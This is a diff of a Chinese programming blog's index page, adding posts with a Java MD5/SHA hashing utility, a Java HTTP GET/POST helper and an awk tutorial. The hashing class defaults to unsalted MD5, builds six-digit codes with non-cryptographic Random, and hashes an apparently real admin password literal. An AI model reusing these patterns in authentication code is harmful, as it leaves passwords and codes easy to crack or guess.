+  	<time datetime="2019-01-15T08:22:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">package util;</span><br><span class="line"></span><br><span class="line">import java.io.UnsupportedEncodingException;</span><br><span class="line">import java.security.MessageDigest;</span><br><span class="line">import java.security.NoSuchAlgorithmException;</span><br><span class="line">import java.util.Random;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.</span><br><span class="line"> * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。</span><br><span class="line"> */</span><br><span class="line">public class HashUtil &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 生成六位随机数</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public String creatRandom()&#123;</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        String result=&quot;&quot;;</span><br><span class="line">        for (int i=0;i&lt;6;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result+=random.nextInt(10);</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法</span><br><span class="line">    public static  String getMd5(String str, String... type)&#123;</span><br><span class="line">        MessageDigest messageDigest = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException</span><br><span class="line">            //messageDigest = MessageDigest.getInstance(&quot;SHA-512&quot;);</span><br><span class="line">            //messageDigest = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">            messageDigest = (type.length == 0) ? MessageDigest.getInstance(&quot;MD5&quot;) : MessageDigest.getInstance(type[0]);</span><br><span class="line">            //重置摘要</span><br><span class="line">            messageDigest.reset();</span><br><span class="line">            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException</span><br><span class="line">            messageDigest.update(str.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">        &#125;catch (NoSuchAlgorithmException e1)&#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;catch (UnsupportedEncodingException e2)&#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)</span><br><span class="line">        byte[] md5byte = messageDigest.digest();</span><br><span class="line"></span><br><span class="line">        StringBuffer md5Str = new StringBuffer();</span><br><span class="line">        for(int i=0; i&lt;md5byte.length; i++)&#123;</span><br><span class="line">            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变</span><br><span class="line">            if(Integer.toHexString(0xFF &amp; md5byte[i]).length() == 1)&#123;</span><br><span class="line">                //位运算后为1位十六进制情况,前面补0</span><br><span class="line">                md5Str.append(&quot;0&quot;).append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                //位运算后为2位十六进制情况，直接append</span><br><span class="line">                md5Str.append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return md5Str.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static  void main(String[] args)&#123;</span><br><span class="line">        System.out.println(getMd5(&quot;adminbonc123&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
 
@@ -177,7 +678,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">springboot</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">wheels</a>
         		</li>
       		
 		</ul>
@@ -187,7 +688,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/19/java/spring-schdule/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/01/15/wheels/java/hashutil/">展开全文 >></a>
         </p>
       
 
@@ -217,31 +718,27 @@
 
 
   
-    <article id="post-java/泛型" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-wheels/java/httpclient" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/15/java/泛型/">泛型</a>
+      <a class="article-title" href="/2019/01/15/wheels/java/httpclient/">httpclient</a>
     </h1>
   
 
         
-        <a href="/2018/11/15/java/泛型/" class="archive-article-date">
-  	<time datetime="2018-11-15T03:41:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-15</time>
+        <a href="/2019/01/15/wheels/java/httpclient/" class="archive-article-date">
+  	<time datetime="2019-01-15T08:21:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="1-lt-T"><a href="#1-lt-T" class="headerlink" title="1. &lt;T>"></a>1. &lt;T></h4><p>泛型<t> T可以为任意大写字母<br><br>可以多泛型&lt;T,U&gt;等<br><br>单独的<t>表示T为Object下的子类。<br></t></t></p>
-<p>类型绑定: <t extends="" xxx=""> 表示T为继承XXX类型的子类<br></t></p>
-<h4 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h4><h6 id="1-泛型类"><a href="#1-泛型类" class="headerlink" title="1.泛型类"></a>1.泛型类</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class GenericDemo &lt;T&gt;&#123;</span><br><span class="line">    public   T test(T t)&#123;</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        GenericDemo&lt;String&gt; genericDemo = new GenericDemo&lt;&gt;();</span><br><span class="line">        System.out.println(genericDemo.test(&quot;aa&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h6 id="2-泛型方法"><a href="#2-泛型方法" class="headerlink" title="2.泛型方法"></a>2.泛型方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class GenericMethod &#123;</span><br><span class="line">    public static &lt;T&gt; T test(T t) &#123;</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line">    public static  void  main(String[] args) &#123;</span><br><span class="line">        System.out.println(test(&quot;aa&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h6 id="3-泛型接口"><a href="#3-泛型接口" class="headerlink" title="3.泛型接口"></a>3.泛型接口</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public interface GenericInterface &lt;T,U&gt; &#123;</span><br><span class="line">    T test(U u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class GenericInterfaceClass implements GenericInterface&lt;String,String&gt;&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public String test(String a)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">package util;</span><br><span class="line"></span><br><span class="line">import org.omg.CORBA.portable.OutputStream;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下</span><br><span class="line"> */</span><br><span class="line">public class HttpClientUtil &#123;</span><br><span class="line">    /**</span><br><span class="line">     * url为地址，params 为请求参数 如 id=1&amp;name=xx</span><br><span class="line">     * @param url</span><br><span class="line">     * @param params</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    private static  Map get(String url, String params)&#123;</span><br><span class="line">        HttpURLConnection connection = null;</span><br><span class="line">        BufferedReader br = null;</span><br><span class="line">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            URL send_url = params.equals(&quot;&quot;) ? new URL(url) : new URL(url + &quot;?&quot; + params);</span><br><span class="line">            connection = (HttpURLConnection) send_url.openConnection();</span><br><span class="line">            connection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">            //一些设置</span><br><span class="line">            connection.setRequestProperty(&quot;Connection&quot;,&quot;keep-alive&quot;);</span><br><span class="line">            connection.setRequestProperty(&quot;Accept-Charset&quot;,&quot;utf8, gbk; q=0.6&quot;);</span><br><span class="line">            //content-type浏览器会自动解析</span><br><span class="line">            //connection.setRequestProperty(&quot;Content-Type&quot;,&quot;application/json&quot;);</span><br><span class="line">            //connection.setDoOutput(true);</span><br><span class="line">            connection.setUseCaches(false);</span><br><span class="line"></span><br><span class="line">            connection.connect();</span><br><span class="line">            headers = connection.getHeaderFields();</span><br><span class="line"></span><br><span class="line">            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),&quot;UTF-8&quot;));</span><br><span class="line">            String line = &quot;&quot;;</span><br><span class="line">            while ((line = br.readLine()) != null)&#123;</span><br><span class="line">                sb.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">            res.put(&quot;headers&quot;,headers);</span><br><span class="line">            res.put(&quot;response&quot;, sb);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.out.println(&quot;http_get 异常！&quot;);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if(connection != null)&#123;</span><br><span class="line">                    connection.disconnect();</span><br><span class="line">                &#125;</span><br><span class="line">                if(br != null)&#123;</span><br><span class="line">                    br.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;catch (Exception e2)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * params为postc参数</span><br><span class="line">     * @param url</span><br><span class="line">     * @param params</span><br><span class="line">     */</span><br><span class="line">    private static  Map post(String url, String params)&#123;</span><br><span class="line">        HttpURLConnection connection = null;</span><br><span class="line">        BufferedReader br = null;</span><br><span class="line">        OutputStreamWriter out = null;</span><br><span class="line">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            URL send_url = new URL(url);</span><br><span class="line">            connection = (HttpURLConnection)send_url.openConnection();</span><br><span class="line"></span><br><span class="line">            connection.setRequestMethod(&quot;POST&quot;);</span><br><span class="line">            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);</span><br><span class="line">            connection.setRequestProperty(&quot;Connection&quot;, &quot;Keep-Alive&quot;);</span><br><span class="line">            connection.setUseCaches(false);</span><br><span class="line">            //以后就可以使用conn.getOutputStream().write()</span><br><span class="line">            connection.setDoOutput(true);</span><br><span class="line">            //以后就可以使用conn.getInputStream().read();</span><br><span class="line">            connection.setDoInput(true);</span><br><span class="line"></span><br><span class="line">            out = new OutputStreamWriter(connection.getOutputStream(),&quot;UTF-8&quot;);</span><br><span class="line">            out.write(params);</span><br><span class="line">            out.flush();</span><br><span class="line"></span><br><span class="line">            headers = connection.getHeaderFields();</span><br><span class="line">            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = br.readLine()) != null)&#123;</span><br><span class="line">                sb.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            res.put(&quot;headers&quot;,headers);</span><br><span class="line">            res.put(&quot;response&quot;,sb.toString());</span><br><span class="line">        &#125;catch (Exception e1)&#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if(connection != null)&#123;</span><br><span class="line">                    connection.disconnect();</span><br><span class="line">                &#125;</span><br><span class="line">                if(br != null)&#123;</span><br><span class="line">                    br.close();</span><br><span class="line">                &#125;</span><br><span class="line">                if(out != null)&#123;</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;catch (Exception e2)&#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void xxxx()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[])&#123;</span><br><span class="line">//        Map&lt;String,Object&gt; res = get(&quot;http://127.0.0.1:8080/test1&quot;,&quot;&quot;);</span><br><span class="line">//        System.out.println(res.get(&quot;response&quot;));</span><br><span class="line">//        System.out.println(res.get(&quot;headers&quot;));</span><br><span class="line">//        Map&lt;String,List&lt;String&gt;&gt; headers  = (Map&lt;String, List&lt;String&gt;&gt;)res.get(&quot;headers&quot;);</span><br><span class="line">//        System.out.println(headers.get(&quot;Content-Type&quot;));</span><br><span class="line"></span><br><span class="line">        String params = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    \&quot;status\&quot;: 0,\n&quot; +</span><br><span class="line">                &quot;    \&quot;data\&quot;: \&quot;hello world!\&quot;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        Map&lt;String,Object&gt; res = post(&quot;http://127.0.0.1:8080/test2&quot;,params);</span><br><span class="line">        System.out.println(res.get(&quot;response&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
 
@@ -257,6 +754,10 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">wheels</a>
+        		</li>
       		
 		</ul>
 	</div>
@@ -265,7 +766,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/15/java/泛型/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/01/15/wheels/java/httpclient/">展开全文 >></a>
         </p>
       
 
@@ -295,38 +796,39 @@
 
 
   
-    <article id="post-java/reflect" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-tools/awk" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/07/java/reflect/">Java反射</a>
+      <a class="article-title" href="/2018/12/31/tools/awk/">awk用法</a>
     </h1>
   
 
         
-        <a href="/2018/11/07/java/reflect/" class="archive-article-date">
-  	<time datetime="2018-11-07T02:30:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-07</time>
+        <a href="/2018/12/31/tools/awk/" class="archive-article-date">
+  	<time datetime="2018-12-31T03:55:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>详见:<a href="https://www.sczyh30.com/posts/Java/java-reflection-1/" target="_blank" rel="noopener">https://www.sczyh30.com/posts/Java/java-reflection-1/</a><br><br><a href="https://blog.csdn.net/ljphhj/article/details/12858767" target="_blank" rel="noopener">https://blog.csdn.net/ljphhj/article/details/12858767</a></p>
-<h4 id="1-什么是反射"><a href="#1-什么是反射" class="headerlink" title="1.什么是反射"></a>1.什么是反射</h4><blockquote>
-<p>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.<br>The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control</p>
-</blockquote>
-<p>反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br><br>反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br><br>Java 反射主要提供以下功能：</p>
+        <h4 id="1-awk"><a href="#1-awk" class="headerlink" title="1.awk"></a>1.awk</h4><p>用于处理文本</p>
+<h4 id="2-用法"><a href="#2-用法" class="headerlink" title="2.用法"></a>2.用法</h4><p>参考<a href="http://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="noopener">菜鸟教程</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">awk [选项参数] &apos;script&apos; var=value file(s)</span><br><span class="line">或</span><br><span class="line">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure></p>
+<h6 id="1-选项参数"><a href="#1-选项参数" class="headerlink" title="1.选项参数"></a>1.选项参数</h6><ul>
+<li>-F fs or –field-separator fs<br><br>指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk -F, &apos;&#123;print $1,$2&#125;&apos; xxx.txt</span><br><span class="line">以逗号为分隔符，打印第一第二列</span><br></pre></td></tr></table></figure>
 <ul>
-<li>在运行时判断任意一个对象所属的类；</li>
-<li>在运行时构造任意一个类的对象；</li>
-<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>
-<li>在运行时调用任意一个对象的方法</li>
+<li>-v var=value or –asign var=value<br>赋值一个用户定义变量。</li>
 </ul>
-<p><strong>在运行时，而不是编译时.</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk -va=1 &apos;&#123;print $1,$1+a&#125;&apos; xxx.txt</span><br><span class="line">设置a为变量，打印第一和a+1列</span><br></pre></td></tr></table></figure>
+<h6 id="2-运算符"><a href="#2-运算符" class="headerlink" title="2.运算符"></a>2.运算符</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">= += -= *= /= %= ^= **=	赋值</span><br><span class="line">?:	C条件表达式</span><br><span class="line">||	逻辑或</span><br><span class="line">&amp;&amp;	逻辑与</span><br><span class="line">~ ~!	匹配正则表达式和不匹配正则表达式</span><br><span class="line">&lt; &lt;= &gt; &gt;= != ==	关系运算符</span><br><span class="line">空格	连接</span><br><span class="line">+ -	加，减</span><br><span class="line">* / %	乘，除与求余</span><br><span class="line">+ - !	一元加，减和逻辑非</span><br><span class="line">^ ***	求幂</span><br><span class="line">++ --	增加或减少，作为前缀或后缀</span><br><span class="line">$	字段引用</span><br><span class="line">in	数组成员</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;$1&gt;2&apos; xxx.txt</span><br><span class="line">输出第一列大于2的行</span><br><span class="line">awk -F, &apos;$1&gt;2&apos; xxx.txt</span><br><span class="line">输出第一列大于2的行(字符串也会进行比较 例:value1-2 &gt; 2)</span><br><span class="line">value1-1 + value1-2 = 0?</span><br><span class="line">awk -F, &apos;$1=2&apos; xxx.txt</span><br><span class="line">将第一列赋值为2</span><br><span class="line">awk &apos;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&apos; xxx.txt</span><br><span class="line">第一列大于2并且第二列等于&apos;Are&apos;的行,输出第一二三列</span><br></pre></td></tr></table></figure>
+<h6 id="3-内建变量"><a href="#3-内建变量" class="headerlink" title="3.内建变量"></a>3.内建变量</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$n	当前记录的第n个字段，字段间由FS分隔</span><br><span class="line">$0	完整的输入记录</span><br><span class="line">ARGC	命令行参数的数目</span><br><span class="line">ARGIND	命令行中当前文件的位置(从0开始算)</span><br><span class="line">ARGV	包含命令行参数的数组</span><br><span class="line">CONVFMT	数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组</span><br><span class="line">ERRNO	最后一个系统错误的描述</span><br><span class="line">FIELDWIDTHS	字段宽度列表(用空格键分隔)</span><br><span class="line">FILENAME	当前文件名</span><br><span class="line">FNR	各文件分别计数的行号</span><br><span class="line">FS	字段分隔符(默认是任何空格)</span><br><span class="line">IGNORECASE	如果为真，则进行忽略大小写的匹配</span><br><span class="line">NF	一条记录的字段的数目</span><br><span class="line">NR	已经读出的记录数，就是行号，从1开始</span><br><span class="line">OFMT	数字的输出格式(默认值是%.6g)</span><br><span class="line">OFS	输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</span><br><span class="line">ORS	输出记录分隔符(默认值是一个换行符)</span><br><span class="line">RLENGTH	由match函数所匹配的字符串的长度</span><br><span class="line">RS	记录分隔符(默认是一个换行符)</span><br><span class="line">RSTART	由match函数所匹配的字符串的第一个位置</span><br><span class="line">SUBSEP	数组下标分隔符(默认值是/034)</span><br></pre></td></tr></table></figure>
 
       
 
@@ -340,7 +842,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
         		</li>
       		
 		</ul>
@@ -350,7 +852,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/07/java/reflect/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/12/31/tools/awk/">展开全文 >></a>
         </p>
       
 
@@ -380,282 +882,46 @@
 
 
   
-    <article id="post-security/xss" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-base/httpandsocket/http与socket" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/06/security/xss/">xss</a>
+      <a class="article-title" href="/2018/12/24/base/httpandsocket/http与socket/">Http与Socket</a>
     </h1>
   
 
         
-        <a href="/2018/11/06/security/xss/" class="archive-article-date">
-  	<time datetime="2018-11-06T06:43:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-06</time>
+        <a href="/2018/12/24/base/httpandsocket/http与socket/" class="archive-article-date">
+  	<time datetime="2018-12-24T02:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-24</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
